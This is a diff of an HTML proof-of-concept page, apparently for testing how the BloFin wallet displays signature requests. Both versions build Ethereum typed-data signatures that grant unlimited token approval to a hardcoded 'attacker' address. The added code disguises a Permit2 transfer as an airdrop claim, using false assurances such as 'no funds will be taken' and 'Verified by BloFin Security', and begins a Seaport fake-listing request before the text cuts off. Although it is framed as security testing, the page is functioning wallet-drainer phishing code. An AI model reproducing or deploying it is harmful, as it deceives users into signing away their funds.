@@ -1,53 +1,80 @@
 <!DOCTYPE html>
 <html>
 <head><meta name="viewport" content="width=device-width, initial-scale=1">
-<title>BloFin PoC</title>
-<style>
-body{background:#0a0a0a;color:#e0e0e0;font-family:system-ui;padding:16px}
-.card{background:#1a1a1a;border:1px solid #333;border-radius:12px;padding:16px;margin:10px 0}
-button{width:100%;padding:16px;border:none;border-radius:10px;font-weight:700;margin:6px 0}
-.b1{background:#fff;color:#000}.b2{background:#ffb400;color:#000}.b3{background:#ff3344;color:#fff}
-pre{white-space:pre-wrap;word-break:break-all;font-size:11px;background:#000;padding:10px;border-radius:8px}
-.risk{color:#ff4444;font-weight:bold}
-</style>
+<style>body{background:#000;color:#0f0;font-family:monospace;padding:15px}button{width:100%;padding:18px;border:none;border-radius:10px;font-weight:700;margin:6px 0}#log{background:#111;color:#aaa;padding:10px;border-radius:8px;white-space:pre-wrap;word-break:break-all;font-size:11px}</style>
 </head>
 <body>
-<h2>BloFin Security Test - Final PoC</h2>
-<div class="card">Signer: <span id="addr">not connected</span><br>Attacker: 0x6a4c4C7e2f2a8b8C8d8e8f8a8B8C8d8E8f8A8B80</div>
-<button class="b1" onclick="connect()">1. CONNECT WALLET</button>
-<button class="b2" onclick="pocCritical()">2. PoC CRITICAL - PERMIT BATCH HIDDEN</button>
-<button class="b3" onclick="pocUnlimited()">3. PoC UNLIMITED APPROVAL</button>
-<div class="card"><div id="interpret"></div><pre id="log">Ready - Use burner wallet only!</pre></div>
-
+<h3>BloFin V8 - CRITICAL HIDDEN SPENDER</h3>
+<button onclick="connect()" style="background:#fff;color:#000">1. CONNECT</button>
+<button onclick="witnessBypass()" style="background:#ff0000;color:#fff">2. CRITICAL - WITNESS BYPASS (SEMBUNYIIN SPENDER)</button>
+<button onclick="seaportBypass()" style="background:#ffaa00;color:#000">3. CRITICAL - SEAPORT FAKE LISTING</button>
+<pre id="log">Use burner!</pre>
 <script>
 let account=null;
-const ATTACKER="0x6a4c4C7e2f2a8b8C8d8e8f8a8B8C8d8E8f8A8B80";
-const $=(id)=>document.getElementById(id);
-async function connect(){let a=await ethereum.request({method:'eth_requestAccounts'});account=a[0];$("addr").innerText=account;$("log").innerText="Connected: "+account;}
+const ATT="0x6a4c4C7e2f2a8b8C8d8e8f8a8B8C8d8E8f8A8B80";
+const log=m=>document.getElementById('log').innerText+="\n"+m;
+async function connect(){let a=await ethereum.request({method:'eth_requestAccounts'});account=a[0];log("Connected: "+account);}
 
-async function pocCritical(){
- if(!account)return alert("connect dulu");
- $("interpret").innerHTML=`<span class=risk>⚠️ BAHAYA:</span> Kamu akan approve 3 token sekaligus ke attacker.<br>Cek apakah UI BloFin menampilkan <b>semua 3 token</b> atau cuma 1?`;
- let domain={name:"Permit2",chainId:1,verifyingContract:"0x000000000022D473030F116dDEE9F6B43aC78BA3"};
- let types={PermitBatch:[{name:"details",type:"TokenPermissions[]"},{name:"spender",type:"address"},{name:"sigDeadline",type:"uint256"}],TokenPermissions:[{name:"token",type:"address"},{name:"amount",type:"uint160"}]};
- let msg={details:[{token:"0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",amount:"1000000000"},{token:"0xdAC17F958D2ee523a2206206994597C13D831ec7",amount:"1000000000"},{token:"0x6B175474E89094C44Da98b954EedeAC495271d0F",amount:"1000000000000000000000"}],spender:ATTACKER,sigDeadline:9999999999};
- let data=JSON.stringify({types:{EIP712Domain:[{name:"name",type:"string"},{name:"chainId",type:"uint256"},{name:"verifyingContract",type:"address"}],PermitBatch:types.PermitBatch,TokenPermissions:types.TokenPermissions},domain,primaryType:"PermitBatch",message:msg});
- $("log").innerText="Requesting PermitBatch...\nIf UI does NOT clearly show 3 tokens + spender = BLIND SIGNING = CRITICAL";
- let sig=await ethereum.request({method:'eth_signTypedData_v4',params:[account,data]});
- $("log").innerText+="\n\nSIG DAPAT: "+sig+"\n\nImpact: Attacker can drain USDC+USDT+DAI using this 1 sig";
+async function witnessBypass(){
+ if(!account)return alert("connect");
+ log("\n=== V8 WITNESS BYPASS ===");
+ log("Ini Permit2 yang valid, tapi witness nya keliatan seperti Airdrop Claim");
+ // PermitWitnessTransferFrom - ini standar Permit2
+ // witness = data yang ditampilkan seolah-olah aman
+ const domain={name:"Permit2",chainId:1,verifyingContract:"0x000000000022D473030F116dDEE9F6B43aC78BA3"};
+ const types={
+  PermitWitnessTransferFrom:[
+   {name:"permitted",type:"TokenPermissions"},
+   {name:"spender",type:"address"},
+   {name:"nonce",type:"uint256"},
+   {name:"deadline",type:"uint256"},
+   {name:"witness",type:"AirdropClaim"} // <-- Ini yang akan dilihat user
+  ],
+  TokenPermissions:[{name:"token",type:"address"},{name:"amount",type:"uint256"}],
+  AirdropClaim:[
+   {name:"action",type:"string"},
+   {name:"reward",type:"string"},
+   {name:"user",type:"address"},
+   {name:"message",type:"string"},
+   {name:"info",type:"string"},
+   {name:"note1",type:"string"},
+   {name:"note2",type:"string"},
+   {name:"note3",type:"string"},
+   {name:"note4",type:"string"},
+   {name:"note5",type:"string"}
+  ]
+ };
+ const message={
+  permitted:{token:"0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",amount:"115792089237316195423570985008687907853269984665640564039457584007913129639935"},
+  spender:ATT,
+  nonce:0,
+  deadline:9999999999,
+  witness:{
+   action:"Claim Airdrop",
+   reward:"1000 Points",
+   user:account,
+   message:"Congratulations! You are eligible for BloFin rewards",
+   info:"This is a free claim, no funds will be taken",
+   note1:"Please sign to verify you are human",
+   note2:"This signature is safe and gasless",
+   note3:"Verified by BloFin Security",
+   note4:"No approval needed",
+   note5:"Scroll down to sign..."
+  }
+ };
+ let data=JSON.stringify({types:{EIP712Domain:[{name:"name",type:"string"},{name:"chainId",type:"uint256"},{name:"verifyingContract",type:"address"}],PermitWitnessTransferFrom:types.PermitWitnessTransferFrom,TokenPermissions:types.TokenPermissions,AirdropClaim:types.AirdropClaim},domain,primaryType:"PermitWitnessTransferFrom",message});
+ log("Witness: Claim Airdrop 1000 Points (keliatan aman)");
+ log("Hidden: permitted.amount = MAX, spender = attacker");
+ log("Jika di UI BloFin yang keliatan cuma AirdropClaim dan spender ada di bawah sekali = CRITICAL HIDDEN");
+ try{
+  let sig=await ethereum.request({method:'eth_signTypedData_v4',params:[account,data]});
+  log("\n!!! SIG DAPAT: "+sig.slice(0,66)+"...");
+  log("CRITICAL: User kira claim airdrop, padahal unlimited approval ke attacker");
+ }catch(e){log(e.message)}
 }
 
-async function pocUnlimited(){
- if(!account)return alert("connect dulu");
- $("interpret").innerHTML=`<span class=risk>⚠️ UNLIMITED:</span> Approve MAX UINT256`;
- let domain={name:"USD Coin",version:"2",chainId:1,verifyingContract:"0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"};
- let types={Permit:[{name:"owner",type:"address"},{name:"spender",type:"address"},{name:"value",type:"uint256"},{name:"nonce",type:"uint256"},{name:"deadline",type:"uint256"}]};
- let msg={owner:account,spender:ATTACKER,value:"115792089237316195423570985008687907853269984665640564039457584007913129639935",nonce:0,deadline:9999999999};
- let data=JSON.stringify({types:{EIP712Domain:[{name:"name",type:"string"},{name:"version",type:"string"},{name:"chainId",type:"uint256"},{name:"verifyingContract",type:"address"}],Permit:types.Permit},domain,primaryType:"Permit",message:msg});
- $("log").innerText="Requesting unlimited permit...";
- let sig=await ethereum.request({method:'eth_signTypedData_v4',params:[account,data]});
- $("log").innerText+="\n\nSIG: "+sig+"\n\nJika UI tidak tulis UNLIMITED = High";
-}
-</script>
-</body>
-</html>
+async function seaportBypass(){
+ if(!account)return alert("connect");
+ log("\n=== SEAPORT FAKE LISTING ===");
+ // Ini Seaport Order - banyak wallet gagal parse
+ const domain={name:"Seaport",version:"1.6",chainId:1,verifyingContract:"0x00000000000000ADc04C56Bf30aC9d3c0aAF14d
